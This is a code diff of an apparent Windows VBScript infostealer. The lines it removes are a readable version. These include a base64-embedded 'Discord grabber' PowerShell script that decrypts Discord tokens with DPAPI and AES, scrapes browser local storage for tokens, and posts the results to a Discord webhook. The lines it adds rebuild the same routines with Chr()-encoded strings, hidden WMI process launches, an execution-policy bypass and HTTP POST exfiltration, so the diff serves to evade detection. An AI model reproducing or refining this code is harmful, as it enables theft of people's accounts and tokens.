(Chr(96)&Chr(96)&Chr(96)&Chr(34)&Chr(125)&Chr(93)&Chr(44)&Chr(34)&Chr(102)&Chr(111)&Chr(111)&Chr(116)&Chr(101)&Chr(114)&Chr(34)&Chr(58)&Chr(123)&Chr(34)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(34)&Chr(58)&Chr(34)&Chr(76)&Chr(111)&Chr(103)&Chr(103)&Chr(101)&Chr(100)&Chr(58)&Chr(32)) & X11(Now()) & (Chr(34)&Chr(125)&Chr(125)&Chr(93)&Chr(125))
+    Dim X20
+    Set X20 = CreateObject((Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48)))
+    X20.SetOption 2, 13056
+    X20.Open (Chr(80)&Chr(79)&Chr(83)&Chr(84)), X16, False
+    X20.SetRequestHeader (Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101)), (Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(47)&Chr(106)&Chr(115)&Chr(111)&Chr(110))
+    X20.Send X47
+    Set X20 = Nothing
+End Sub
 
-Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
-    If i = 0 Then Exit Sub
-    Dim r: r = True
-    Do While r
-        Set w = GetObject("winmgmts:\\.\root\cimv2")
-        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
-        Set w = Nothing
-        If r Then WScript.Sleep 150
+Function X5(X37): X5 = "": Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)): Dim X48: X48 = X7((Chr(100)&Chr(112)&Chr(105)&Chr(46)&Chr(116)&Chr(120)&Chr(116))): Dim X49: X49 = X7((Chr(100)&Chr(112)&Chr(111)&Chr(46)&Chr(116)&Chr(120)&Chr(116))): X15.DeleteFile X49, True: X8 X48, X37
+    Dim X50: X50 = (Chr(65)&Chr(100)&Chr(100)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(45)&Chr(65)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(46)&Chr(83)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(59)&Chr(116)&Chr(114)&Chr(121)&Chr(123)&Chr(36)&Chr(98)&Chr(61)&Chr(91)&Chr(67)&Chr(111)&Chr(110)&Chr(118)&Chr(101)&Chr(114)&Chr(116)&Chr(93)&Chr(58)&Chr(58)&Chr(70)&Chr(114)&Chr(111)&Chr(109)&Chr(66)&Chr(97)&Chr(115)&Chr(101)&Chr(54)&Chr(52)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(40)&Chr(40)&Chr(71)&Chr(101)&Chr(116)&Chr(45)&Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(32)&Chr(39)) & X48 & (Chr(39)&Chr(32)&Chr(45)&Chr(82)&Chr(97)&Chr(119)&Chr(41)&Chr(46)&Chr(84)&Chr(114)&Chr(105)&Chr(109)&Chr(40)&Chr(41)&Chr(41)&Chr(59)&Chr(36)&Chr(100)&Chr(61)&Chr(91)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(46)&Chr(83)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(46)&Chr(67)&Chr(114)&Chr(121)&Chr(112)&Chr(116)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(112)&Chr(104)&Chr(121)&Chr(46)&Chr(80)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(68)&Chr(97)&Chr(116)&Chr(97)&Chr(93)&Chr(58)&Chr(58)&Chr(85)&Chr(110)&Chr(112)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(40)&Chr(36)&Chr(98)&Chr(44)&Chr(36)&Chr(110)&Chr(117)&Chr(108)&Chr(108)&Chr(44)&Chr(91)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(46)&Chr(83)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(46)&Chr(67)&Chr(114)&Chr(121)&Chr(112)&Chr(116)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(112)&Chr(104)&Chr(121)&Chr(46)&Chr(68)&Chr(97)&Chr(116)&Chr(97)&Chr(80)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(83)&Chr(99)&Chr(111)&Chr(112)&Chr(101)&Chr(93)&Chr(58)&Chr(58)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(41)&Chr(59)&Chr(91)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(46)&Chr(84)&Chr(101)&Chr(120)&Chr(116)&Chr(46)&Chr(69)&Chr(110)&Chr(99)&Chr(111)&Chr(100)&Chr(105)&Chr(110)&Chr(103)&Chr(93)&Chr(58)&Chr(58)&Chr(85)&Chr(84)&Chr(70)&Chr(56)&Chr(46)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(40)&Chr(36)&Chr(100)&Chr(41)&Chr(124)&Chr(79)&Chr(117)&Chr(116)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(39)) & X49 & (Chr(39)&Chr(32)&Chr(45)&Chr(69)&Chr(110)&Chr(99)&Chr(111)&Chr(100)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(117)&Chr(116)&Chr(102)&Chr(56)&Chr(125)&Chr(99)&Chr(97)&Chr(116)&Chr(99)&Chr(104)&Chr(123)&Chr(39)&Chr(39)&Chr(124)&Chr(79)&Chr(117)&Chr(116)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(39)) & X49 & (Chr(39)&Chr(125))
+    Dim X51: X51 = X7((Chr(100)&Chr(112)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(112)&Chr(115)&Chr(49))): X8 X51, X50: X6 (Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(114)&Chr(111)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(80)&Chr(111)&Chr(108)&Chr(105)&Chr(99)&Chr(121)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)) & X51 & (Chr(34))
+    If X15.FileExists(X49) Then If X15.GetFile(X49).Size > 20 Then X5 = X9(X49)
+    X15.DeleteFile X48, True: X15.DeleteFile X51, True: X15.DeleteFile X49, True: End Function
+
+Sub X6(X52): Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)): Dim X53,X54,X26,X55: Set X53 = GetObject((Chr(119)&Chr(105)&Chr(110)&Chr(109)&Chr(103)&Chr(109)&Chr(116)&Chr(115)&Chr(58)&Chr(92)&Chr(92)&Chr(46)&Chr(92)&Chr(114)&Chr(111)&Chr(111)&Chr(116)&Chr(92)&Chr(99)&Chr(105)&Chr(109)&Chr(118)&Chr(50))): Set X55 = X53.Get((Chr(87)&Chr(105)&Chr(110)&Chr(51)&Chr(50)&Chr(95)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(117)&Chr(112))).SpawnInstance_: X55.ShowWindow = 0: Set X54 = X53.Get((Chr(87)&Chr(105)&Chr(110)&Chr(51)&Chr(50)&Chr(95)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115))): X54.Create X52,,X55,X26
+    If X26 = 0 Then Exit Sub
+    Dim X56: X56 = True
+    Do While X56
+        Set X53 = GetObject((Chr(119)&Chr(105)&Chr(110)&Chr(109)&Chr(103)&Chr(109)&Chr(116)&Chr(115)&Chr(58)&Chr(92)&Chr(92)&Chr(46)&Chr(92)&Chr(114)&Chr(111)&Chr(111)&Chr(116)&Chr(92)&Chr(99)&Chr(105)&Chr(109)&Chr(118)&Chr(50)))
+        X56 = (X53.ExecQuery((Chr(83)&Chr(69)&Chr(76)&Chr(69)&Chr(67)&Chr(84)&Chr(32)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(32)&Chr(70)&Chr(82)&Chr(79)&Chr(77)&Chr(32)&Chr(87)&Chr(105)&Chr(110)&Chr(51)&Chr(50)&Chr(95)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(87)&Chr(72)&Chr(69)&Chr(82)&Chr(69)&Chr(32)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(61)) & X26).Count > 0)
+        Set X53 = Nothing
+        If X56 Then WScript.Sleep 150
     Loop
 End Sub
 
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+Function X7(X57): X7 = X14.ExpandEnvironmentStrings((Chr(37)&Chr(84)&Chr(69)&Chr(77)&Chr(80)&Chr(37))) & (Chr(92)) & X57: End Function
+Sub X8(X58, X59): Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)): Dim X60: Set X60 = X15.CreateTextFile(X58, True): X60.Write X59: X60.Close: Set X60 = Nothing: End Sub
+Function X9(X58): Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)): X9 = "": Dim X60: Set X60 = X15.OpenTextFile(X58, 1): X9 = X60.ReadAll: X60.Close: Set X60 = Nothing: End Function
 
-Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing: End Sub
+Sub X10(X61, X62): Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)): Dim X63: X63 = X12(): Dim X64: X64 = (Chr(45)&Chr(45)) & X63 & vbCrLf & (Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(68)&Chr(105)&Chr(115)&Chr(112)&Chr(111)&Chr(115)&Chr(105)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(58)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(45)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(59)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(34)&Chr(59)&Chr(32)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61)&Chr(34)) & X61 & (Chr(34)) & vbCrLf & vbCrLf & X62 & vbCrLf & (Chr(45)&Chr(45)) & X63 & (Chr(45)&Chr(45))
+    Dim X20: Set X20 = CreateObject((Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48))): X20.SetOption 2, 13056: X20.Open (Chr(80)&Chr(79)&Chr(83)&Chr(84)), X16, False: X20.SetRequestHeader (Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101)), (Chr(109)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(112)&Chr(97)&Chr(114)&Chr(116)&Chr(47)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(45)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(59)&Chr(32)&Chr(98)&Chr(111)&Chr(117)&Chr(110)&Chr(100)&Chr(97)&Chr(114)&Chr(121)&Chr(61)) & X63: X20.Send X64: Set X20 = Nothing: End Sub
 
-Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
-Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+Function X11(X55): X55 = Replace(X55, (Chr(92)), (Chr(92)&Chr(92))): X55 = Replace(X55, (Chr(34)), (Chr(92)&Chr(34))): X55 = Replace(X55, vbCrLf, (Chr(92)&Chr(110))): X55 = Replace(X55, vbCr, (Chr(92)&Chr(110))): X55 = Replace(X55, vbLf, (Chr(92)&Chr(110))): X55 = Replace(X55, vbTab, (Chr(92)&Chr(116))): X11 = X55: End Function
+Function X12(): Dim X42: Set X42 = CreateObject((Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(108)&Chr(101)&Chr(116)&Chr(46)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(76)&Chr(105)&Chr(98))): X12 = Mid(X42.GUID, 2, 36): Set X42 = Nothing: End Function
 
-' === DISCORD GRABBER (embedded base64) ===
-DG_B64 = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwoKJFdIID0gJ2h0"
-DG_B64 = DG_B64 & "dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1NDU0MTA2MTY5NTU2MzM3MDcvbFR5"
-DG_B64 = DG_B64 & "dkc3ZFNvSVpBV1h1OVVuZU52bWxDWC1LazR0RUNJYmpZM2N4TUt5bnN1Tm9ETllPaFlqam5j"
-DG_B64 = DG_B64 & "aGx3ZTBQSzlBSzgnCiRVQSA9ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42"
-DG_B64 = DG_B64 & "NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUv"
-DG_B64 = DG_B64 & "MTI2LjAuMC4wIFNhZmFyaS81MzcuMzYnCgokcHViSVAgPSAnJwp0cnkgeyAkcHViSVAgPSAo"
-DG_B64 = DG_B64 & "SW52b2tlLVJlc3RNZXRob2QgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycgLVRpbWVvdXRTZWMg"
-DG_B64 = DG_B64 & "NSkgfSBjYXRjaCB7fQoKIyBBRVMtR0NNIENUUiBkZWNyeXB0b3IgKERpc2NvcmQgZGVza3Rv"
-DG_B64 = DG_B64 & "cCB0b2tlbiBlbmNyeXB0aW9uKQpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5TZWN1"
-DG_B64 = DG_B64 & "cml0eQp0cnkgewogICAgJGMwID0gQCcKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uU2Vj"
-DG_B64 = DG_B64 & "dXJpdHkuQ3J5cHRvZ3JhcGh5OwpwdWJsaWMgY2xhc3MgRFggewogICAgcHVibGljIHN0YXRp"
-DG_B64 = DG_B64 & "YyBieXRlW10gRChieXRlW10gaywgYnl0ZVtdIG4sIGJ5dGVbXSBjKXsKICAgICAgICB1c2lu"
-DG_B64 = DG_B64 & "Zyh2YXIgYSA9IEFlcy5DcmVhdGUoKSl7IGEuS2V5ID0gazsgYS5Nb2RlID0gQ2lwaGVyTW9k"
-DG_B64 = DG_B64 & "ZS5FQ0I7IGEuUGFkZGluZyA9IFBhZGRpbmdNb2RlLk5vbmU7CiAgICAgICAgYnl0ZVtdIG8g"
-DG_B64 = DG_B64 & "PSBuZXcgYnl0ZVtjLkxlbmd0aF07IGJ5dGVbXSB4ID0gbmV3IGJ5dGVbMTZdOyBBcnJheS5D"
-DG_B64 = DG_B64 & "b3B5KG4sIHgsIDEyKTsgeFsxNV0gPSAyOwogICAgICAgIHVzaW5nKHZhciBlID0gYS5DcmVh"
-DG_B64 = DG_B64 & "dGVFbmNyeXB0b3IoKSl7IGZvcihpbnQgaSA9IDA7IGkgPCBjLkxlbmd0aDsgaSArPSAxNil7"
-DG_B64 = DG_B64 & "CiAgICAgICAgICAgIGJ5dGVbXSBiID0gZS5UcmFuc2Zvcm1GaW5hbEJsb2NrKHgsIDAsIDE2"
-DG_B64 = DG_B64 & "KTsgaW50IG0gPSBNYXRoLk1pbigxNiwgYy5MZW5ndGggLSBpKTsKICAgICAgICAgICAgZm9y"
-DG_B64 = DG_B64 & "KGludCBqID0gMDsgaiA8IG07IGorKykgb1tpICsgal0gPSAoYnl0ZSkoY1tpICsgal0gXiBi"
-DG_B64 = DG_B64 & "W2pdKTsKICAgICAgICAgICAgZm9yKGludCBqID0gMTU7IGogPj0gMTI7IGotLSl7IGlmKCsr"
-DG_B64 = DG_B64 & "eFtqXSAhPSAwKSBicmVhazsgfSB9IH0KICAgICAgICByZXR1cm4gbzsgfSB9Cn0KJ0AKICAg"
-DG_B64 = DG_B64 & "IEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkYzAgLUxhbmd1YWdlIENTaGFycAp9IGNhdGNo"
-DG_B64 = DG_B64 & "IHt9CgokdG9rZW5zID0gQHt9CgpmdW5jdGlvbiBSZWFkLUZpbGVUZXh0KCRwYXRoKSB7CiAg"
-DG_B64 = DG_B64 & "ICAkciA9ICRudWxsCiAgICB0cnkgewogICAgICAgICRmcyA9IFtJTy5GaWxlXTo6T3Blbigk"
-DG_B64 = DG_B64 & "cGF0aCwgW0lPLkZpbGVNb2RlXTo6T3BlbiwgW0lPLkZpbGVBY2Nlc3NdOjpSZWFkLCBbSU8u"
-DG_B64 = DG_B64 & "RmlsZVNoYXJlXTo6UmVhZFdyaXRlKQogICAgICAgICRzciA9IE5ldy1PYmplY3QgSU8uU3Ry"
-DG_B64 = DG_B64 & "ZWFtUmVhZGVyKCRmcykKICAgICAgICAkciA9ICRzci5SZWFkVG9FbmQoKTsgJHNyLkNsb3Nl"
-DG_B64 = DG_B64 & "KCk7ICRmcy5DbG9zZSgpCiAgICB9IGNhdGNoIHt9CiAgICByZXR1cm4gJHIKfQoKIyAtLS0t"
-DG_B64 = DG_B64 & "IERlc2t0b3AgRGlzY29yZCBjbGllbnRzICh0b2tlbiBlbmNyeXB0ZWQgd2l0aCBkUXc0dzlX"
-DG_B64 = DG_B64 & "Z1hjUSBrZXkpIC0tLS0KJG0wID0gJG51bGwKdHJ5IHsKICAgICRwMCA9ICIkZW52OkFQUERB"
-DG_B64 = DG_B64 & "VEFcZGlzY29yZFxMb2NhbCBTdGF0ZSIKICAgICRqMCA9IEdldC1Db250ZW50ICRwMCAtUmF3"
-DG_B64 = DG_B64 & "IHwgQ29udmVydEZyb20tSnNvbgogICAgJGIwID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3Ry"
-DG_B64 = DG_B64 & "aW5nKCRqMC5vc19jcnlwdC5lbmNyeXB0ZWRfa2V5KQogICAgJG0wID0gW1NlY3VyaXR5LkNy"
-DG_B64 = DG_B64 & "eXB0b2dyYXBoeS5Qcm90ZWN0ZWREYXRhXTo6VW5wcm90ZWN0KCRiMFs1Li4oJGIwLkxlbmd0"
-DG_B64 = DG_B64 & "aCAtIDEpXSwgJG51bGwsIFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuRGF0YVByb3RlY3Rpb25T"
-DG_B64 = DG_B64 & "Y29wZV06OkN1cnJlbnRVc2VyKQp9IGNhdGNoIHt9Cgpmb3JlYWNoICgkZGlyIGluIEAoCiAg"
-DG_B64 = DG_B64 & "ICAiJGVudjpBUFBEQVRBXGRpc2NvcmRcTG9jYWwgU3RvcmFnZVxsZXZlbGRiIiwKICAgICIk"
-DG_B64 = DG_B64 & "ZW52OkFQUERBVEFcZGlzY29yZHB0YlxMb2NhbCBTdG9yYWdlXGxldmVsZGIiLAogICAgIiRl"
-DG_B64 = DG_B64 & "bnY6QVBQREFUQVxkaXNjb3JkY2FuYXJ5XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYiIKKSkgewog"
-DG_B64 = DG_B64 & "ICAgaWYgKCEoVGVzdC1QYXRoICRkaXIpKSB7IGNvbnRpbnVlIH0KICAgICRmaWxlcyA9IEdl"
-DG_B64 = DG_B64 & "dC1DaGlsZEl0ZW0gJGRpciAtRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8"
-DG_B64 = DG_B64 & "IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW1hdGNoICdcLihsZGJ8bG9nKSQnIH0KICAgIGZv"
-DG_B64 = DG_B64 & "cmVhY2ggKCRmIGluICRmaWxlcykgewogICAgICAgICRyID0gUmVhZC1GaWxlVGV4dCAkZi5G"
-DG_B64 = DG_B64 & "dWxsTmFtZQogICAgICAgIGlmICghJHIgLW9yICEkbTApIHsgY29udGludWUgfQogICAgICAg"
-DG_B64 = DG_B64 & "IGZvcmVhY2ggKCRtIGluIFtyZWdleF06Ok1hdGNoZXMoJHIsICdkUXc0dzlXZ1hjUTooW0Et"
-DG_B64 = DG_B64 & "WmEtejAtOSsvPV17NDAsMzAwfSknKSkgewogICAgICAgICAgICAkYjY0ID0gJG0uR3JvdXBz"
-DG_B64 = DG_B64 & "WzFdLlZhbHVlCiAgICAgICAgICAgIHdoaWxlICgkYjY0Lkxlbmd0aCAlIDQgLW5lIDApIHsg"
-DG_B64 = DG_B64 & "JGI2NCArPSAnPScgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJGUgPSBb"
-DG_B64 = DG_B64 & "Q29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGI2NCkKICAgICAgICAgICAgICAgIGlmICgk"
-DG_B64 = DG_B64 & "ZS5MZW5ndGggLWx0IDgwKSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICR0ayA9IFtU"
-DG_B64 = DG_B64 & "ZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0RYXTo6RCgkbTAsICRlWzMuLjE0XSwg"
-DG_B64 = DG_B64 & "JGVbMTUuLigkZS5MZW5ndGggLSAxNyldKSkuVHJpbUVuZChbY2hhcl0wKQogICAgICAgICAg"
-DG_B64 = DG_B64 & "ICAgICAgaWYgKCR0ay5MZW5ndGggLWd0IDQwIC1hbmQgISR0b2tlbnMuQ29udGFpbnNLZXko"
-DG_B64 = DG_B64 & "JHRrKSkgeyAkdG9rZW5zWyR0a10gPSAkdHJ1ZSB9CiAgICAgICAgICAgIH0gY2F0Y2gge30K"
-DG_B64 = DG_B64 & "ICAgICAgICB9CiAgICB9Cn0KCiMgLS0tLSBCcm93c2VycyAod2ViIHRva2VucyBhcmUgUExB"
-DG_B64 = DG_B64 & "SU5URVhUIGluIGxvY2FsU3RvcmFnZSBsZXZlbGRiLCBVVEYtMTZMRSkgLS0tLQpmb3JlYWNo"
-DG_B64 = DG_B64 & "ICgkYnIgaW4gQCgKICAgICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIg"
-DG_B64 = DG_B64 & "RGF0YSIsCiAgICAiJGVudjpMT0NBTEFQUERBVEFcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRh"
-DG_B64 = DG_B64 & "IiwKICAgICIkZW52OkxPQ0FMQVBQREFUQVxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJc"
-DG_B64 = DG_B64 & "VXNlciBEYXRhIiwKICAgICIkZW52OkFQUERBVEFcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3Rh"
-DG_B64 = DG_B64 & "YmxlIiwKICAgICIkZW52OkFQUERBVEFcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl"
-DG_B64 = DG_B64 & "IiwKICAgICIkZW52OkxPQ0FMQVBQREFUQVxWaXZhbGRpXFVzZXIgRGF0YSIKKSkgewogICAg"
-DG_B64 = DG_B64 & "aWYgKCEoVGVzdC1QYXRoICRicikpIHsgY29udGludWUgfQogICAgJHByb2ZzID0gR2V0LUNo"
-DG_B64 = DG_B64 & "aWxkSXRlbSAkYnIgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8"
-DG_B64 = DG_B64 & "IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWVxICdEZWZhdWx0JyAtb3IgJF8uTmFtZSAtbWF0"
-DG_B64 = DG_B64 & "Y2ggJ15Qcm9maWxlJyB9CiAgICBmb3JlYWNoICgkcCBpbiAkcHJvZnMpIHsKICAgICAgICAk"
-DG_B64 = DG_B64 & "bHNkID0gSm9pbi1QYXRoICRwLkZ1bGxOYW1lICdMb2NhbCBTdG9yYWdlXGxldmVsZGInCiAg"
-DG_B64 = DG_B64 & "ICAgICAgaWYgKCEoVGVzdC1QYXRoICRsc2QpKSB7IGNvbnRpbnVlIH0KICAgICAgICAkZmls"
-DG_B64 = DG_B64 & "ZXMgPSBHZXQtQ2hpbGRJdGVtICRsc2QgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u"
-DG_B64 = DG_B64 & "dGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1tYXRjaCAnXC4obGRifGxvZykkJyB9"
-DG_B64 = DG_B64 & "CiAgICAgICAgZm9yZWFjaCAoJGYgaW4gJGZpbGVzKSB7CiAgICAgICAgICAgICRyID0gUmVh"
-DG_B64 = DG_B64 & "ZC1GaWxlVGV4dCAkZi5GdWxsTmFtZQogICAgICAgICAgICBpZiAoISRyKSB7IGNvbnRpbnVl"
-DG_B64 = DG_B64 & "IH0KICAgICAgICAgICAgIyBTdHJpcCBudWxsIGJ5dGVzIChDaHJvbWl1bSBsb2NhbFN0b3Jh"
-DG_B64 = DG_B64 & "Z2UgdmFsdWVzIGFyZSBVVEYtMTZMRSAtPiB0b2tlbiBjaGFycyBzcGxpdCBieSBceDAwKQog"
-DG_B64 = DG_B64 & "ICAgICAgICAgICAkciA9ICRyIC1yZXBsYWNlICJceDAwIiwgIiIKICAgICAgICAgICAgZm9y"
-DG_B64 = DG_B64 & "ZWFjaCAoJG0gaW4gW3JlZ2V4XTo6TWF0Y2hlcygkciwgJ1tBLVphLXowLTlfLV17MjR9XC5b"
